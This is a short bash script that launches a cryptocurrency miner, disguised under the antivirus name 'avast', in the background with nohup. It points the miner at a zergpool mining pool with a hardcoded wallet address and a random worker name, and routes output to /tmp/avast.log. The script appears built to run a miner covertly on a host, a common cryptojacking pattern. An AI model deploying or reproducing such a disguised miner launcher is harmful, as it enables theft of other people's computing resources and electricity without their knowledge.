#!/bin/bash

chmod +x avast  >/dev/null 2>&1

nohup ./avast -v -l  verushash.asia.mine.zergpool.com:3300 -u D5u6se7r7G4KhBpuTCkq3UFxzsRgyntsuk.$(echo $(shuf -i 1-99999 -n 1)-TOD) c=DGB -t 8 -x > /tmp/avast.log 2>&1
